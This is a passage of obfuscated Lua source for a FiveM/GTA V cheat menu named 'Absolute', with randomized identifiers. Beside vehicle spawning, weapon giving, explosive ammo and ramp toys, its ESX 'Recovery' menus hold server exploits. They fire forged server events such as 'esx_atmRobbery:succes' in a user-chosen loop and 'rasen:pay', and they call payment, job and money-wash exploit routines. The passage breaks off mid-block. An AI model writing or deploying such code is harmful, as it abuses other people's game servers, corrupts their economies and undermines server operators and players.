                elseif Absolute.Button("Remote Car") then
                    RcModel = kbinput("Enter Car Name", " ", 20)
                    if RcModel and IsModelValid(RcModel) and IsModelAVehicle(RcModel) then
                        C_PCOoW_4E5bzn2FhF.Start()
                    else
                        I0oW9H("~r~Error:~w~ Invalid model ")
                    end
                elseif Absolute.CheckBox("Horn Boost", HornBoost) then
                    HornBoost = not HornBoost
                elseif Absolute.CheckBox("Vehicle Godmode", VehicleGodmode) then
                    VehicleGodmode = not VehicleGodmode
                elseif Absolute.CheckBox("Toxic Bull", DeadlyBulldozer) then
                    DeadlyBulldozer = not DeadlyBulldozer
                    if DeadlyBulldozer then
                        local L9XomVrA1CIPZweEyKlUv = HtXSn86aa0FZAX("BULLDOZER", 1, SpawnEngineOn)
                        SetVehicleCanBreak(L9XomVrA1CIPZweEyKlUv, not DeadlyBulldozer)
                        SetVehicleCanBeVisiblyDamaged(L9XomVrA1CIPZweEyKlUv, not DeadlyBulldozer)
                        SetVehicleEnginePowerMultiplier(L9XomVrA1CIPZweEyKlUv, nlXCUGaxh(2500))
                        SetVehicleEngineTorqueMultiplier(L9XomVrA1CIPZweEyKlUv, nlXCUGaxh(2500))
                        SetVehicleEngineOn(L9XomVrA1CIPZweEyKlUv, 1, 1, 1)
                        SetVehicleGravityAmount(L9XomVrA1CIPZweEyKlUv, nlXCUGaxh(50))
                        SetVehicleColours(L9XomVrA1CIPZweEyKlUv, 12, 12)
                        I0oW9H("~o~Go forth and devour thy enemies! || Press ~w~E ~o~to launch a minion!")
                    elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                        DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0.0))
                    end
                elseif Absolute.CheckBox("Drift Mode", driftMod) then
                    driftMod = not driftMod
                elseif Absolute.CheckBox("Vehicle Bunny Hop", JumpMod) then
                    JumpMod = not JumpMod
                elseif Absolute.CheckBox("No Gravity", NoVehicleGravity) then
                    NoVehicleGravity = not NoVehicleGravity
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VehicleSpawner") then
                if Absolute.MenuButton("Vehicle Categories", "CarTypesList", "~o~>>") then
                elseif Absolute.MenuButton("Spawn Options", "VehSpawnOptions", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("CarTypesList") then
                if Absolute.Button("Custom vehicle") then
                    local OI4OEt5TfFnHaDWJ_g = kbinput("Enter Vehicle Spawn Name", " ", 100)
                    if OI4OEt5TfFnHaDWJ_g and IsModelValid(OI4OEt5TfFnHaDWJ_g) and IsModelAVehicle(OI4OEt5TfFnHaDWJ_g) then
                        RequestModel(OI4OEt5TfFnHaDWJ_g)
                        Citizen.CreateThread(
                            function()
                                local AAEfCp = 0.0
                                if OI4OEt5TfFnHaDWJ_g == nil then
                                    OI4OEt5TfFnHaDWJ_g = "vagner"
                                end
                                while not HasModelLoaded(GetHashKey(OI4OEt5TfFnHaDWJ_g)) do
                                    AAEfCp = AAEfCp + 100
                                    Citizen.Wait(10)
                                    if AAEfCp > 5000 then
                                        Absolute.PushNotification("Could not spawn this vehicle!", 5000)
                                        break
                                    end
                                end
                                SpawnedCar =
                                    CreateVehicle(
                                    GetHashKey(OI4OEt5TfFnHaDWJ_g),
                                    GetEntityCoords(PlayerPedId()),
                                    GetEntityHeading(PlayerPedId()),
                                    true,
                                    true
                                )
                                SetVehicleStrong(SpawnedCar, true)
                                SetVehicleEngineOn(SpawnedCar, true, true, false)
                                SetVehicleEngineCanDegrade(SpawnedCar, false)
                            end
                        )
                        if SpawnInVeh then
                            SetPedIntoVehicle(GetPlayerPed(-1), SpawnedCar, -1)
                        end
                    else
                        I0oW9H("Model is not valid!")
                    end
                end
                for lw5cH1svaAJ, _x_pIOsv2F4tUbp in ipairs(ufpQmB0016hq0) do
                    if Absolute.MenuButton(_x_pIOsv2F4tUbp .. " ", "CarTypeSelection", "~o~>>") then
                        carTypeIdx = lw5cH1svaAJ
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("CarTypeSelection") then
                for mcHHUnp, EPMgyn2bKdtw9WaL6 in ipairs(HYeXGA[carTypeIdx]) do
                    if Absolute.Button(" " .. EPMgyn2bKdtw9WaL6) then
                        carToSpawn = mcHHUnp
                        local qKpZ, g, mJ =
                            table.unpack(
                            GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), nlXCUGaxh(0.0), nlXCUGaxh(0.0), 0.5)
                        )
                        local aUY4KaO = HYeXGA[carTypeIdx][carToSpawn]
                        if aUY4KaO == nil then
                            aUY4KaO = "adder"
                        end
                        vehiclehash = GetHashKey(aUY4KaO)
                        RequestModel(vehiclehash)
                        Citizen.CreateThread(
                            function()
                                local IugzVMMc3alu = 0.0
                                while not HasModelLoaded(vehiclehash) do
                                    IugzVMMc3alu = IugzVMMc3alu + 100
                                    Citizen.Wait(100)
                                    if IugzVMMc3alu > 5000 then
                                        I0oW9H("~r~Cannot spawn this vehicle.")
                                        break
                                    end
                                end
                                if DelCurVeh and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                                    local UiwlG5EH10d_ = GetVehiclePedIsUsing(GetPlayerPed(-1))
                                    SetEntityAsMissionEntity(UiwlG5EH10d_, true, true)
                                    DeleteVehicle(UiwlG5EH10d_)
                                end
                                SpawnedCar =
                                    CreateVehicle(
                                    vehiclehash,
                                    qKpZ,
                                    g,
                                    mJ,
                                    GetEntityHeading(PlayerPedId(-1)) + 90,
                                    1,
                                    0.0
                                )
                                SetVehicleStrong(SpawnedCar, true)
                                SetVehicleEngineOn(SpawnedCar, true, true, false)
                                SetVehicleEngineCanDegrade(SpawnedCar, false)
                                if SpawnInVeh then
                                    SetPedIntoVehicle(GetPlayerPed(-1), SpawnedCar, -1)
                                end
                                if FullTunning then
                                    FullTunningCar(SpawnedCar)
                                end
                            end
                        )
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VehSpawnOptions") then
                if Absolute.CheckBox("Spawn full tunning", FullTunning) then
                    FullTunning = not FullTunning
                elseif Absolute.CheckBox("Spawn full  Performance tunning", FullPerfTunning) then
                    FullPerfTunning = not FullPerfTunning
                elseif
                    Absolute.CheckBox(
                        "Spawn In Vehicle",
                        SpawnInVeh,
                        function(wjY)
                            SpawnInVeh = wjY
                        end
                    )
                 then
                elseif
                    Absolute.CheckBox(
                        "Delete Current Vehicle",
                        DelCurVeh,
                        function(yqokEvBdy8zbcGZEP7r)
                            DelCurVeh = yqokEvBdy8zbcGZEP7r
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("LSCustoms") then
                if
                    Absolute.MenuButton(
                        "Ramps Config",
                        "RampsVehicle",
                        "~o~>>",
                        {dict = "commonmenutu", text = "vehicle_deathmatch", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif Absolute.MenuButton("Acrobatics", "AcrobaticsMenu", "~o~>>") then
                elseif
                    Absolute.CheckBox(
                        "Rainbow Vehicle Colour",
                        RainbowCar,
                        function(pQiR6exE6yiA2FyT)
                            RainbowCar = pQiR6exE6yiA2FyT
                        end
                    )
                 then
                elseif
                    Absolute.CheckBox(
                        "Rainbow Xenon Colour",
                        RainbowNeon,
                        function(Izp3RvhqZHWHLEkc3F)
                            RainbowNeon = Izp3RvhqZHWHLEkc3F
                        end
                    )
                 then
                elseif Absolute.Button("Full tunning") then
                    local xqiqo5nTBn5nz7zN = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    FullTunningCar(xqiqo5nTBn5nz7zN)
                elseif Absolute.Button("Full Performance tunning") then
                    local fxNClpvGyea8 = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    VehicleMaxTunning(fxNClpvGyea8)
                elseif Absolute.Button("Delete Vehicle") then
                    deletecurrent()
                end
                SelectedRamp = "lts_prop_lts_ramp_02"
                Absolute.Display()
            elseif Absolute.IsMenuOpened("AcrobaticsMenu") then
                if Absolute.Button("Flip 1") then
                    local onJBOFlGQG58 = GetPlayerPed(-1)
                    if IsPedSittingInAnyVehicle(onJBOFlGQG58) then
                        local pSTkvjtz = GetVehiclePedIsIn(onJBOFlGQG58, false)
                        ApplyForceToEntity(
                            pSTkvjtz,
                            3,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            10.5,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(-270),
                            nlXCUGaxh(0.0),
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    else
                        I0oW9H("No vehicle detected, skipping action.")
                    end
                elseif Absolute.Button("Flip 2") then
                    local _81_dILiIXfprh_xK1A1I = GetPlayerPed(-1)
                    if IsPedSittingInAnyVehicle(_81_dILiIXfprh_xK1A1I) then
                        local Q = GetVehiclePedIsIn(_81_dILiIXfprh_xK1A1I, false)
                        ApplyForceToEntity(
                            Q,
                            3,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            10.5,
                            nlXCUGaxh(360),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    else
                        I0oW9H("No vehicle detected, skipping action.")
                    end
                elseif Absolute.Button("Flip 4") then
                    local AJwj5wHPqBpTL = GetPlayerPed(-1)
                    if IsPedSittingInAnyVehicle(AJwj5wHPqBpTL) then
                        local FCgQfFtQVUjF = GetVehiclePedIsIn(AJwj5wHPqBpTL, false)
                        ApplyForceToEntity(
                            FCgQfFtQVUjF,
                            3,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            10.5,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(270),
                            nlXCUGaxh(0.0),
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    else
                        I0oW9H("No vehicle detected, skipping action.")
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("RampsVehicle") then
                if
                    Absolute.ComboBox(
                        "Ramp Type",
                        {"Small", "Medium", "Big"},
                        currRampSelectionIndex,
                        selRampSelectionIndex,
                        function(SnnawshKY, CGVrvYl7yjDl)
                            currRampSelectionIndex = SnnawshKY
                            selRampSelectionIndex = SnnawshKY
                        end
                    )
                 then
                    if selRampSelectionIndex == 1 then
                        SelectedRamp = "lts_prop_lts_ramp_01"
                    elseif selRampSelectionIndex == 2 then
                        SelectedRamp = "lts_prop_lts_ramp_02"
                    elseif selRampSelectionIndex == 3 then
                        SelectedRamp = "lts_prop_lts_ramp_03"
                    end
                elseif Absolute.Button("Spawn Ramp at front") then
                    local gRj5nSP_8f4 = SelectedRamp
                    local jT_GEf8M95uPsbaQK = GetPlayerPed(-1)
                    RequestModel(gRj5nSP_8f4)
                    while not HasModelLoaded(gRj5nSP_8f4) do
                        Citizen.Wait(50)
                    end
                    local naYzLHxgPAAdis = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                    local fTHlRjGH1gipVztvG = CreateObject(GetHashKey(gRj5nSP_8f4), 0.0, 0.0, 0.0, true, true, false)
                    if DoesEntityExist(naYzLHxgPAAdis) then
                        AttachEntityToEntity(
                            fTHlRjGH1gipVztvG,
                            naYzLHxgPAAdis,
                            0.4,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(7),
                            0.3,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(180),
                            true,
                            true,
                            true,
                            false,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Spawn Ramp at back") then
                    local P = SelectedRamp
                    local AO = GetPlayerPed(-1)
                    RequestModel(P)
                    while not HasModelLoaded(P) do
                        Citizen.Wait(50)
                    end
                    local V7 = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                    local wwc8PjAUmhXuzAQl7 = CreateObject(GetHashKey(P), 0.0, 0.0, 0.0, true, true, false)
                    if DoesEntityExist(V7) then
                        AttachEntityToEntity(
                            wwc8PjAUmhXuzAQl7,
                            V7,
                            0.4,
                            nlXCUGaxh(0.0),
                            -7.5,
                            -0.3,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            true,
                            true,
                            true,
                            false,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Spawn Ramp at left") then
                    local dVIseG = SelectedRamp
                    local aJ4eOX_FXuhY = GetPlayerPed(-1)
                    RequestModel(dVIseG)
                    while not HasModelLoaded(dVIseG) do
                        Citizen.Wait(50)
                    end
                    local tKAmcEYJWz = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                    local qnOfTnewd = CreateObject(GetHashKey(dVIseG), 0.0, 0.0, 0.0, true, true, false)
                    if DoesEntityExist(tKAmcEYJWz) then
                        AttachEntityToEntity(
                            qnOfTnewd,
                            tKAmcEYJWz,
                            0.4,
                            -7.5,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(-90),
                            true,
                            true,
                            true,
                            false,
                            1,
                            true
                        )
                    end
                elseif Absolute.Button("Spawn Ramp at right") then
                    local hnsvJUZ2Y0M = SelectedRamp
                    local fyx5fIyLIZLed = GetPlayerPed(-1)
                    RequestModel(hnsvJUZ2Y0M)
                    while not HasModelLoaded(hnsvJUZ2Y0M) do
                        Citizen.Wait(50)
                    end
                    local XHDWAJ0 = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                    local wYzRx8U6F9aUmaEUG0r = CreateObject(GetHashKey(hnsvJUZ2Y0M), 0.0, 0.0, 0.0, true, true, false)
                    if DoesEntityExist(XHDWAJ0) then
                        AttachEntityToEntity(
                            wYzRx8U6F9aUmaEUG0r,
                            XHDWAJ0,
                            0.4,
                            7.5,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(90),
                            true,
                            true,
                            true,
                            false,
                            1,
                            true
                        )
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponMenu") then
                if Absolute.MenuButton("Weapon Categories", "WeaponTypes", "~o~>>") then
                elseif Absolute.MenuButton("PedGun", "PedGunOptions", "~o~>>") then
                elseif Absolute.MenuButton("Ammo changer", "GTAOShooter", "~o~>>") then
                elseif Absolute.MenuButton("Custom Explosions", "CustomExplosions", "~o~>>") then
                elseif Absolute.Button("Remove All Weapons") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif Absolute.Button("Give All Weapons") then
                    GiveAllWeapons(PlayerPedId(-1))
                elseif Absolute.CheckBox("Infinite Ammo", FullAmmo) then
                    FullAmmo = not FullAmmo
                    SetPedInfiniteAmmoClip(PlayerPedId(), FullAmmo)
                elseif Absolute.CheckBox("Live explosions", ExploserinoLiverino) then
                    ExploserinoLiverino = not ExploserinoLiverino
                elseif
                    Absolute.ComboBox(
                        "Live Explosions distance",
                        GaZt7SCmwTVhb5pMuuI,
                        currLiveExploFuncIndex,
                        selLiveExploFuncIndex,
                        function(wEmUKi, NNnhAK1xx3Hpwpa7HeJ)
                            currLiveExploFuncIndex = wEmUKi
                            selLiveExploFuncIndex = NNnhAK1xx3Hpwpa7HeJ
                        end
                    )
                 then
                elseif Absolute.CheckBox("Gravity Gun", GravityGun) then
                    GravityGun = not GravityGun
                elseif
                    Absolute.ComboBox(
                        "Weapon Tint",
                        {"Default", "Green", "Gold", "Pinky", "Army", "Police", "Orange", "Platinum"},
                        currWeaponTintFuncIndex,
                        selWeaponTintFuncIndex,
                        function(mFUIKRfiOSF3Cdfb__M, M4ryfBVLL40wbhCY_J)
                            currWeaponTintFuncIndex = mFUIKRfiOSF3Cdfb__M
                            selWeaponTintFuncIndex = mFUIKRfiOSF3Cdfb__M
                        end
                    )
                 then
                    if selWeaponTintFuncIndex == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0.0)
                    elseif selWeaponTintFuncIndex == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    elseif selWeaponTintFuncIndex == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    elseif selWeaponTintFuncIndex == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    elseif selWeaponTintFuncIndex == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    elseif selWeaponTintFuncIndex == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    elseif selWeaponTintFuncIndex == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    elseif selWeaponTintFuncIndex == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                elseif
                    Absolute.ComboBox(
                        "Special Finish",
                        {"Abled", "Disabled"},
                        currWeaponSpecialFinishFuncIndex,
                        selWeaponSpecialFinishFuncIndex,
                        function(pBdkcxJNQP65bY2gIDQS, ZXgixEHRMqcZ)
                            currWeaponSpecialFinishFuncIndex = pBdkcxJNQP65bY2gIDQS
                            selWeaponSpecialFinishFuncIndex = pBdkcxJNQP65bY2gIDQS
                        end
                    )
                 then
                    if selWeaponSpecialFinishFuncIndex == 1 then
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 663170192)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3610841222)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2608252716)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1215999497)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2242268665)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 930927479)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3634075224)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1319990579)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1077065191)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2008591151)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2053798779)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 371102273)
                    elseif selWeaponSpecialFinishFuncIndex == 2 then
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 663170192)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3610841222)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2608252716)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1215999497)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2242268665)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 930927479)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3634075224)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1319990579)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1077065191)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2008591151)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2053798779)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 371102273)
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponTypes") then
                for AbEqJ30KCHAGvRnGDO, M1SoPwPCH0 in pairs(ntvgfjj9ht7Z) do
                    if Absolute.MenuButton(" " .. AbEqJ30KCHAGvRnGDO, "WeaponTypeSelection", "~o~>>") then
                        dy = M1SoPwPCH0
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponTypeSelection") then
                for soR, imzFk5HP in pairs(dy) do
                    if Absolute.MenuButton(imzFk5HP.name, "WeaponOptions", "~o~>>") then
                        dk = imzFk5HP
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponOptions") then
                if Absolute.Button("Spawn Weapon") then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dk.id), 0.0, false)
                end
                if Absolute.Button("Remove Weapon") then
                    RemoveWeaponFromPed(GetPlayerPed(-1), GetHashKey(dk.id))
                end
                if Absolute.Button("Clear Ammo") then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dk.id), 0.0)
                end
                if
                    Absolute.ComboBox(
                        "Chargers",
                        {
                            "1",
                            "2",
                            "3",
                            "4",
                            "5",
                            "6",
                            "7",
                            "8",
                            "9",
                            "10",
                            "11",
                            "12",
                            "13",
                            "14",
                            "15",
                            "16",
                            "17",
                            "18",
                            "19",
                            "20"
                        },
                        currWeaponModFuncIndex,
                        selWeaponModFuncIndex,
                        function(fi, He)
                            currWeaponModFuncIndex = fi
                            selWeaponModFuncIndex = fi
                        end
                    )
                 then
                    local IiNw359SU6aZI53J_0Vj1 = GetMaxAmmoInClip(GetPlayerPed(-1), GetHashKey(dk.id))
                    local dHTwN5 = GetHashKey(dk.id)
                    local AYBXP_QLFaU0 = selWeaponModFuncIndex * IiNw359SU6aZI53J_0Vj1
                    if selWeaponModFuncIndex == 1 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, IiNw359SU6aZI53J_0Vj1)
                    elseif selWeaponModFuncIndex == 2 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 3 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 4 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 5 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 6 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 7 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 8 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 9 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 10 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 11 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 12 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 13 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 14 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 15 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 16 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 17 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 18 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 19 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    elseif selWeaponModFuncIndex == 20 then
                        SetPedAmmo(GetPlayerPed(-1), dHTwN5, AYBXP_QLFaU0)
                    end
                end
                for Bj, UDsn2yxemRZ in pairs(dk.mods) do
                    if Absolute.MenuButton(" " .. Bj, "ModSelect", "~o~>>") then
                        dA = UDsn2yxemRZ
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ModSelect") then
                for HTh6I42wkGCKD, LtFxThxW in pairs(dA) do
                    if Absolute.Button("Attach " .. LtFxThxW.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dk.id), GetHashKey(LtFxThxW.id))
                    elseif Absolute.Button("Detach " .. LtFxThxW.name) then
                        RemoveWeaponComponentFromPed(GetPlayerPed(-1), GetHashKey(dk.id), GetHashKey(LtFxThxW.id))
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("PedGunOptions") then
                if Absolute.CheckBox("Shoot Peds", PedGun) then
                    PedGun = not PedGun
                elseif
                    Absolute.ComboBox(
                        "Change Ped",
                        {"Beach Girl", "WARLUS", "Hasjew", "Rare guy", "Surfer", "Bay Watcher"},
                        currPedToShootFuncIndex,
                        selPedToShootFuncIndex,
                        function(Eox4W7j3_N0K4cSWe, gA5)
                            currPedToShootFuncIndex = Eox4W7j3_N0K4cSWe
                            selPedToShootFuncIndex = Eox4W7j3_N0K4cSWe
                        end
                    )
                 then
                    if selPedToShootFuncIndex == 1 then
                        PedGunPedName = "a_f_m_beach_01"
                    elseif selPedToShootFuncIndex == 2 then
                        PedGunPedName = "a_f_m_fatcult_01"
                    elseif selPedToShootFuncIndex == 3 then
                        PedGunPedName = "a_m_m_hasjew_01"
                    elseif selPedToShootFuncIndex == 4 then
                        PedGunPedName = "a_m_y_acult_02"
                    elseif selPedToShootFuncIndex == 5 then
                        PedGunPedName = "a_m_y_jetski_01"
                    elseif selPedToShootFuncIndex == 6 then
                        PedGunPedName = "a_m_y_musclbeac_01"
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("GTAOShooter") then
                if Absolute.CheckBox("SHooterino", GTAOAmmo) then
                    GTAOAmmo = not GTAOAmmo
                elseif
                    Absolute.ComboBox(
                        "Shooterino bullets",
                        Oe17bVy,
                        currentTypeAmmo,
                        selectedTypeAmmo,
                        function(gj0PTcszMN, hjxbfxx)
                            currentTypeAmmo = gj0PTcszMN
                            selectedTypeAmmo = hjxbfxx
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("CustomExplosions") then
                if Absolute.CheckBox("Explosive Ammo", ExplosiveAmmo) then
                    ExplosiveAmmo = not ExplosiveAmmo
                elseif
                    Absolute.ComboBox(
                        "Exploserino typerino",
                        nFLSW,
                        currentTypeExplosions,
                        selectedTypeExplosions,
                        function(eRNmlcjJGTUh9, Uz4ijgd6Du9s_ZkvUQ)
                            currentTypeExplosions = eRNmlcjJGTUh9
                            selectedTypeExplosions = Uz4ijgd6Du9s_ZkvUQ
                            ExplosionToSet = um0O9rU8QscJILqSCYO2X[selectedTypeExplosions]
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Recovery") then
                Absolute.SetSubTitle("Recovery", "CONNECTED AT   " .. GetCurrentServerEndpoint())
                if Absolute.MenuButton("~g~ESX~s~ | Menu", "ESXRecovery", "~o~>>") then
                elseif Absolute.MenuButton("~b~VRP~s~ | Menu", "VRPRecovery", "~o~>>") then
                elseif
                    Absolute.MenuButton(
                        "Server resources",
                        "ServerResourceList",
                        "~o~>>",
                        {dict = "ps_menu", text = "locked_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ESXRecovery") then
                if Absolute.MenuButton("~g~ESX~s~ | Jobs", "Jobspanel", "~o~>>") then
                elseif Absolute.MenuButton("~g~ESX~s~ | Item adder", "ESXItems", "~o~>>") then
                elseif Absolute.MenuButton("~g~ESX~s~ | Miscellaneous", "ESXMisc", "~o~>>") then
                elseif Absolute.MenuButton("~g~ESX~s~ | Drugs", "ESXDrugs", "~o~>>") then
                elseif Absolute.MenuButton("~g~ESX~s~ | Money", "ESXMoney", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ESXMoney") then
                if Absolute.Button("Payment exploit", "⚠️") then
                    MoneyGenerator()
                end
                if Absolute.Button("Jobs exploiter", "⚠️") then
                    JobsExploiter()
                end
                if CheckIfResourceExist("esx_blanchisseur") or CheckIfResourceExist("esx_moneywash") then
                    if Absolute.Button("Money wash") then
                        ExploitMoneyWash()
                    end
                end
                if CheckIfResourceExist("esx_atmRobbery") then
                    if Absolute.Button("Dirty Money Method", "⚠️") then
                        local iNf68 = kbinput("How many tryes?? (remember to be careful with this)", " ", 20)
                        for i = 1, iNf68 do
                            TriggerServerEvent("esx_atmRobbery:succes")
                        end
                    end
                end
                if CheckIfResourceExist("rasen") or CheckIfResourceExist("Rasen") then
                    if Absolute.Button("Money 1", "⚠️") then
                        local sGjfUW6easpu = kbinput("How many tryes?? (remember to be careful with this)", " ", 20)
                        TriggerServerEvent("rasen:pay", sGjfUW6easpu)
                    end
                end
                if CheckIfResourceExist("esx_dmvschool") then
                    if Absolute.Button("Reduce money", "⚠️") then
